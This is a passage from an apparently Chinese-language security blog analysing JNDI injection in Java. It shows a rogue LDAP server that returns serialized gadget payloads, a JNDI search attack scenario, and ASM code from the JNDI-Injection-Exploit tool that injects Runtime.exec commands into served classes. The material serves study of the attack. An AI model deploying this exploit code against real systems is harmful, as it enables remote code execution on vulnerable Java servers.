</span></span><span style=display:flex><span>            <span style=color:#111>System</span><span style=color:#f92672>.</span><span style=color:#75af00>out</span><span style=color:#f92672>.</span><span style=color:#75af00>println</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;Listening on 0.0.0.0:&#34;</span> <span style=color:#f92672>+</span> <span style=color:#111>port</span><span style=color:#f92672>);</span> <span style=color:#75715e>//$NON-NLS-1$
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>ds</span><span style=color:#f92672>.</span><span style=color:#75af00>startListening</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>private</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>OperationInterceptor</span> <span style=color:#00a8c8>extends</span> <span style=color:#111>InMemoryOperationInterceptor</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>private</span> <span style=color:#111>URL</span> <span style=color:#111>codebase</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>/**
</span></span></span><span style=display:flex><span><span style=color:#75715e>         *
</span></span></span><span style=display:flex><span><span style=color:#75715e>         */</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>public</span> <span style=color:#75af00>OperationInterceptor</span><span style=color:#f92672>(</span><span style=color:#111>URL</span> <span style=color:#111>cb</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>codebase</span> <span style=color:#f92672>=</span> <span style=color:#111>cb</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>/**
</span></span></span><span style=display:flex><span><span style=color:#75715e>         * {@inheritDoc}
</span></span></span><span style=display:flex><span><span style=color:#75715e>         *
</span></span></span><span style=display:flex><span><span style=color:#75715e>         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
</span></span></span><span style=display:flex><span><span style=color:#75715e>         */</span>
</span></span><span style=display:flex><span>        <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>processSearchResult</span><span style=color:#f92672>(</span><span style=color:#111>InMemoryInterceptedSearchResult</span> <span style=color:#111>result</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>String</span> <span style=color:#111>base</span> <span style=color:#f92672>=</span> <span style=color:#111>result</span><span style=color:#f92672>.</span><span style=color:#75af00>getRequest</span><span style=color:#f92672>().</span><span style=color:#75af00>getBaseDN</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#111>Entry</span> <span style=color:#111>e</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Entry</span><span style=color:#f92672>(</span><span style=color:#111>base</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>sendResult</span><span style=color:#f92672>(</span><span style=color:#111>result</span><span style=color:#f92672>,</span> <span style=color:#111>base</span><span style=color:#f92672>,</span> <span style=color:#111>e</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span><span style=color:#111>Exception</span> <span style=color:#111>e1</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>                <span style=color:#111>e1</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>protected</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>sendResult</span><span style=color:#f92672>(</span><span style=color:#111>InMemoryInterceptedSearchResult</span> <span style=color:#111>result</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>base</span><span style=color:#f92672>,</span> <span style=color:#111>Entry</span> <span style=color:#111>e</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//jdk8u191之后
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>addAttribute</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;javaClassName&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;foo&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#75715e>//getObject获取Gadget
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>            <span style=color:#111>e</span><span style=color:#f92672>.</span><span style=color:#75af00>addAttribute</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;javaSerializedData&#34;</span><span style=color:#f92672>,</span> <span style=color:#111>serializeObject</span><span style=color:#f92672>(</span><span style=color:#111>getPayload</span><span style=color:#f92672>()));</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#111>result</span><span style=color:#f92672>.</span><span style=color:#75af00>sendSearchEntry</span><span style=color:#f92672>(</span><span style=color:#111>e</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            <span style=color:#111>result</span><span style=color:#f92672>.</span><span style=color:#75af00>setResult</span><span style=color:#f92672>(</span><span style=color:#00a8c8>new</span> <span style=color:#111>LDAPResult</span><span style=color:#f92672>(</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span> <span style=color:#111>ResultCode</span><span style=color:#f92672>.</span><span style=color:#75af00>SUCCESS</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>和低版本<code>JDK</code>运行的<code>Server</code>端代码差不多，就把<code>sendResult</code>处的代码改成能触发反序列化漏洞的利用链就可以</p><h4 id=refaddress>RefAddress</h4><p><code>com.sun.jndi.ldap.Obj.java#decodeReference</code>函数在对普通的<code>Reference</code>还原的基础上，还可以进一步对<code>RefAddress</code>做还原处理，其中还原过程中，也调用了<code>deserializeObject</code>函数，这意味着我们通过满足<code>RefAddress</code>的方式，也可以达到上面第一种的效果。
需满足以下条件：
1.第一个字符为分隔符
2.第一个分隔符与第二个分隔符之间，表示<code>Reference</code>的<code>position</code>，为<code>int</code>类型
3.第二个分隔符与第三个分隔符之间，表示<code>type</code>，类型
4.第三个分隔符是双分隔符的形式，则进入反序列化的操作
5.序列化数据用<code>base64</code>编码
<code>payload</code>如下</p><pre tabindex=0><code>//方式二
e.addAttribute(&#34;javaClassName&#34;, &#34;foo&#34;);
e.addAttribute(&#34;javaReferenceAddress&#34;,&#34;$1$String$$&#34;+new BASE64Encoder().encode(serializeObject(getPayload())));
e.addAttribute(&#34;objectClass&#34;, &#34;javaNamingReference&#34;); //$NON-NLS-1$
result.sendSearchEntry(e);
result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
</code></pre><p><a href=https://storage.tttang.com/media/attachment/2022/05/25/3eda86ed-bbea-4b55-b2c2-a8e25724d918.png><img src=https://storage.tttang.com/media/attachment/2022/05/25/3eda86ed-bbea-4b55-b2c2-a8e25724d918.png alt=serialize4.png></a></p><p><a href=https://storage.tttang.com/media/attachment/2022/05/25/6e5bcaff-c030-4cf3-85dc-85f19a2917ab.png><img src=https://storage.tttang.com/media/attachment/2022/05/25/6e5bcaff-c030-4cf3-85dc-85f19a2917ab.png alt=serialize5.png></a></p><p><a href=https://storage.tttang.com/media/attachment/2022/05/25/6e95b71e-17aa-4b7d-8eb6-4cac9583a921.png><img src=https://storage.tttang.com/media/attachment/2022/05/25/6e95b71e-17aa-4b7d-8eb6-4cac9583a921.png alt=serialize6.png></a>
触发点二只是一个锦上添花的步骤，我们可以直接用第一种方法，第二种在第一种不能用的情况下可以试试。</p><h2 id=jndi-search>JNDI search</h2><p>lookup()方式是我们能控制ctx.lookup()参数进行对象的查找，LDAP服务器也是攻击者创建的。对于LDAP服务来说，大多数应用使用的是ctx.search()进行属性的查询，这时search会同时使用到几个参数，并且这些参数一般无法控制，但是会受到外部参数的影响，同时search()方式能被利用需要RETURN_OBJECT为true</p><p>对于search方式的攻击需要有对目录属性修改的权限，因此有一些限制，在下面这些场景下可用：</p><ul><li>恶意员工：上面使用了几种利用都使用了modifyAttributes方法，但是需要有修改权限，如果员工具有修改权限那么就能像上面一样注入恶意的属性</li><li>脆弱的LDAP服务器：如果LDAP服务器被入侵了，那么入侵LDAP服务器的攻击者能够进入LDAP服务器修改返回恶意的对象，对用的应用进行查询时就会受到攻击</li><li>易受攻击的应用程序：利用易受攻击的一个应用，如果入侵了这个应用，且它具有对LDAP的写权限，那么利用它使注入LDAP属性，那么其他应用使用LDAP服务是也会遭到攻击</li><li>用于访问LDAP目录的公开Web服务或API：很多现代LDAP服务器提供用于访问LDAP目录的各种Web API。可以是功能或模块，例如REST API，SOAP服务，DSML网关，甚至是单独的产品（Web应用程序）。其中许多API对用户都是透明的，并且仅根据LDAP服务器的访问控制列表（ACL）对它们进行授权。某些ACL允许用户修改其任何除黑名单外的属性</li><li>中间人攻击：尽管当今大多数LDAP服务器使用TLS进行加密他们的通信后，但在网络上的攻击者仍然可能能够进行攻击并修改那些未加密的证书，或使用受感染的证书来修改属性</li><li>&mldr;</li></ul><h3 id=已知漏洞>已知漏洞</h3><ul><li>Spring Security and LDAP projects</li><li>FilterBasedLdapUserSearch.searchForUser()</li><li>SpringSecurityLdapTemplate.searchForSingleEntry()</li><li>SpringSecurityLdapTemplate.searchForSingleEntryInternal(){</li></ul><h2 id=jndi-injection-exploit>JNDI-Injection-Exploit</h2><p>常用的一个工具，提供class的远程加载功能，根据命令行输入动态生成class并放在服务器上</p><h3 id=serverstart>ServerStart</h3><p>作为程序的启动类，处理传入的参数和开启几个server的线程，并打印一些初始信息</p><h3 id=jettyserver>JettyServer</h3><p>将生成好的.class文件加入http server中让被外部访问</p><p>DownloadServlet会对下载/访问情况作log记录，命令部分在</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#111>transformed</span> <span style=color:#f92672>=</span> <span style=color:#111>insertCommad</span><span style=color:#f92672>(</span><span style=color:#111>in</span><span style=color:#f92672>,</span> <span style=color:#111>command</span><span style=color:#f92672>);</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>public</span> <span style=color:#00a8c8>static</span> <span style=color:#00a8c8>byte</span><span style=color:#f92672>[]</span> <span style=color:#75af00>insertCommand</span><span style=color:#f92672>(</span><span style=color:#111>InputStream</span> <span style=color:#111>inputStream</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>command</span><span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>Exception</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>ClassReader</span> <span style=color:#111>cr</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ClassReader</span><span style=color:#f92672>(</span><span style=color:#111>inputStream</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>ClassWriter</span> <span style=color:#111>cw</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>ClassWriter</span><span style=color:#f92672>(</span><span style=color:#111>ClassWriter</span><span style=color:#f92672>.</span><span style=color:#75af00>COMPUTE_FRAMES</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>ClassVisitor</span> <span style=color:#111>cv</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TransformClass</span><span style=color:#f92672>(</span><span style=color:#111>cw</span><span style=color:#f92672>,</span><span style=color:#111>command</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#111>cr</span><span style=color:#f92672>.</span><span style=color:#75af00>accept</span><span style=color:#f92672>(</span><span style=color:#111>cv</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>2</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>return</span> <span style=color:#111>cw</span><span style=color:#f92672>.</span><span style=color:#75af00>toByteArray</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>这里Class开头的三个类都属于ASM库，可以用来操作字节码</p><ul><li>ClassReader</li></ul><p>将.class文件读入到ClassReader的字节数组中，accept方法接受一个ClassVisitor实现类，并按照顺序调用ClassVisitor中的方法</p><ul><li>ClassWriter</li></ul><p>是ClassVisitor的子类，是和ClassReader对应的类，将修改后的类的字节码的内容以字节数组形式输出</p><ul><li>ClassVisitor</li></ul><p>一个抽象类，有很多方法，其中<code>public MethodVisitor visitMethod(xxxx)</code>方法，是当扫描器扫描到类的方法时调用，各个参数分别为修饰符、方法名、方法签名、泛型信息、抛出的异常</p><p>综上，这段插入命令的代码是创建一个ClassReader读入class文件，创建ClassWriter并经过TransformClass的修饰生成ClassVisitor对象，调用ClassReader的accept方法（传入这个ClassVisitor对象），按顺序执行ClassVisitor中的方法</p><p>这个TransformClass是自行实现的</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>static</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>TransformClass</span> <span style=color:#00a8c8>extends</span> <span style=color:#111>ClassVisitor</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>String</span> <span style=color:#111>command</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>TransformClass</span><span style=color:#f92672>(</span><span style=color:#111>ClassVisitor</span> <span style=color:#111>classVisitor</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>command</span><span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>super</span><span style=color:#f92672>(</span><span style=color:#111>Opcodes</span><span style=color:#f92672>.</span><span style=color:#75af00>ASM7</span><span style=color:#f92672>,</span><span style=color:#111>classVisitor</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>command</span> <span style=color:#f92672>=</span> <span style=color:#111>command</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#111>MethodVisitor</span> <span style=color:#75af00>visitMethod</span><span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>final</span> <span style=color:#00a8c8>int</span> <span style=color:#111>access</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>final</span> <span style=color:#111>String</span> <span style=color:#111>name</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>final</span> <span style=color:#111>String</span> <span style=color:#111>descriptor</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>final</span> <span style=color:#111>String</span> <span style=color:#111>signature</span><span style=color:#f92672>,</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>final</span> <span style=color:#111>String</span><span style=color:#f92672>[]</span> <span style=color:#111>exceptions</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>MethodVisitor</span> <span style=color:#111>mv</span> <span style=color:#f92672>=</span> <span style=color:#111>cv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitMethod</span><span style=color:#f92672>(</span><span style=color:#111>access</span><span style=color:#f92672>,</span> <span style=color:#111>name</span><span style=color:#f92672>,</span> <span style=color:#111>descriptor</span><span style=color:#f92672>,</span> <span style=color:#111>signature</span><span style=color:#f92672>,</span> <span style=color:#111>exceptions</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>if</span><span style=color:#f92672>(</span><span style=color:#111>name</span><span style=color:#f92672>.</span><span style=color:#75af00>equals</span><span style=color:#f92672>(</span><span style=color:#d88200>&#34;&lt;clinit&gt;&#34;</span><span style=color:#f92672>)){</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#00a8c8>new</span> <span style=color:#111>TransformMethod</span><span style=color:#f92672>(</span><span style=color:#111>mv</span><span style=color:#f92672>,</span><span style=color:#111>command</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span><span style=color:#00a8c8>else</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#00a8c8>return</span> <span style=color:#111>mv</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>它作为ClassVisitor的实现类，覆写了visitMethod方法，最后return的对象是TransformedMethod</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#00a8c8>static</span> <span style=color:#00a8c8>class</span> <span style=color:#75af00>TransformMethod</span> <span style=color:#00a8c8>extends</span> <span style=color:#111>MethodVisitor</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#111>String</span> <span style=color:#111>command</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#111>TransformMethod</span><span style=color:#f92672>(</span><span style=color:#111>MethodVisitor</span> <span style=color:#111>methodVisitor</span><span style=color:#f92672>,</span><span style=color:#111>String</span> <span style=color:#111>command</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>super</span><span style=color:#f92672>(</span><span style=color:#111>Opcodes</span><span style=color:#f92672>.</span><span style=color:#75af00>ASM7</span><span style=color:#f92672>,</span> <span style=color:#111>methodVisitor</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>this</span><span style=color:#f92672>.</span><span style=color:#75af00>command</span> <span style=color:#f92672>=</span> <span style=color:#111>command</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>visitCode</span><span style=color:#f92672>(){</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Label</span> <span style=color:#111>label0</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Label</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Label</span> <span style=color:#111>label1</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Label</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Label</span> <span style=color:#111>label2</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Label</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitTryCatchBlock</span><span style=color:#f92672>(</span><span style=color:#111>label0</span><span style=color:#f92672>,</span> <span style=color:#111>label1</span><span style=color:#f92672>,</span> <span style=color:#111>label2</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;java/lang/Exception&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitLabel</span><span style=color:#f92672>(</span><span style=color:#111>label0</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitLdcInsn</span><span style=color:#f92672>(</span><span style=color:#111>command</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitVarInsn</span><span style=color:#f92672>(</span><span style=color:#111>Opcodes</span><span style=color:#f92672>.</span><span style=color:#75af00>ASTORE</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitMethodInsn</span><span style=color:#f92672>(</span><span style=color:#111>Opcodes</span><span style=color:#f92672>.</span><span style=color:#75af00>INVOKESTATIC</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;java/lang/Runtime&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;getRuntime&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;()Ljava/lang/Runtime;&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>false</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitVarInsn</span><span style=color:#f92672>(</span><span style=color:#111>Opcodes</span><span style=color:#f92672>.</span><span style=color:#75af00>ALOAD</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitMethodInsn</span><span style=color:#f92672>(</span><span style=color:#111>Opcodes</span><span style=color:#f92672>.</span><span style=color:#75af00>INVOKEVIRTUAL</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;java/lang/Runtime&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;exec&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;(Ljava/lang/String;)Ljava/lang/Process;&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>false</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitInsn</span><span style=color:#f92672>(</span><span style=color:#111>Opcodes</span><span style=color:#f92672>.</span><span style=color:#75af00>POP</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitLabel</span><span style=color:#f92672>(</span><span style=color:#111>label1</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Label</span> <span style=color:#111>label3</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Label</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitJumpInsn</span><span style=color:#f92672>(</span><span style=color:#111>Opcodes</span><span style=color:#f92672>.</span><span style=color:#75af00>GOTO</span><span style=color:#f92672>,</span> <span style=color:#111>label3</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitLabel</span><span style=color:#f92672>(</span><span style=color:#111>label2</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitVarInsn</span><span style=color:#f92672>(</span><span style=color:#111>Opcodes</span><span style=color:#f92672>.</span><span style=color:#75af00>ASTORE</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitVarInsn</span><span style=color:#f92672>(</span><span style=color:#111>Opcodes</span><span style=color:#f92672>.</span><span style=color:#75af00>ALOAD</span><span style=color:#f92672>,</span> <span style=color:#ae81ff>0</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitMethodInsn</span><span style=color:#f92672>(</span><span style=color:#111>Opcodes</span><span style=color:#f92672>.</span><span style=color:#75af00>INVOKEVIRTUAL</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;java/lang/Exception&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;printStackTrace&#34;</span><span style=color:#f92672>,</span> <span style=color:#d88200>&#34;()V&#34;</span><span style=color:#f92672>,</span> <span style=color:#00a8c8>false</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#111>mv</span><span style=color:#f92672>.</span><span style=color:#75af00>visitLabel</span><span style=color:#f92672>(</span><span style=color:#111>label3</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></div><p>可以看到这个方法是从字节码级别插入Runtime.exec的内容</p><p>综上，最后返回的字节码只要被扫描类方法，就会命令执行；直接下载字节码，会发现实际就是在ExecTemplateJDK7中多了个Runtime.getRuntime().exec()的静态代码块</p><h3 id=ldaprefserver>LDAPRefServer</h3><p>使用InMemoryDirectoryServer启动了一个ldap服务端，额外实现了OperationInterceptor用来拦截ldap通信</p><p>ldap查询结果会传给processSearchResult处理，在sendResult中根据codebase获取的javaFactory 也就是template下的class文件，最后将这些信息写入到了result中</p><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75af00>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>public</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>processSearchResult</span> <span style=color:#f92672>(</span> <span style=color:#111>InMemoryInterceptedSearchResult</span> <span style=color:#111>result</span> <span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#111>String</span> <span style=color:#111>base</span> <span style=color:#f92672>=</span> <span style=color:#111>result</span><span style=color:#f92672>.</span><span style=color:#75af00>getRequest</span><span style=color:#f92672>().</span><span style=color:#75af00>getBaseDN</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#111>Entry</span> <span style=color:#111>e</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#111>Entry</span><span style=color:#f92672>(</span><span style=color:#111>base</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>sendResult</span><span style=color:#f92672>(</span><span style=color:#111>result</span><span style=color:#f92672>,</span> <span style=color:#111>base</span><span style=color:#f92672>,</span> <span style=color:#111>e</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#00a8c8>catch</span> <span style=color:#f92672>(</span> <span style=color:#111>Exception</span> <span style=color:#111>e1</span> <span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#111>e1</span><span style=color:#f92672>.</span><span style=color:#75af00>printStackTrace</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#00a8c8>protected</span> <span style=color:#00a8c8>void</span> <span style=color:#75af00>sendResult</span> <span style=color:#f92672>(</span> <span style=color:#111>InMemoryInterceptedSearchResult</span> <span style=color:#111>result</span><span style=color:#f92672>,</span> <span style=color:#111>String</span> <span style=color:#111>base</span><span style=color:#f92672>,</span> <span style=color:#111>Entry</span> <span style=color:#111>e</span> <span style=color:#f92672>)</span> <span style=color:#00a8c8>throws</span> <span style=color:#111>LDAPException</span><span style=color:#f92672>,</span> <span style=color:#111>MalformedURLException</span> <span style=color:#f92672>{</span>
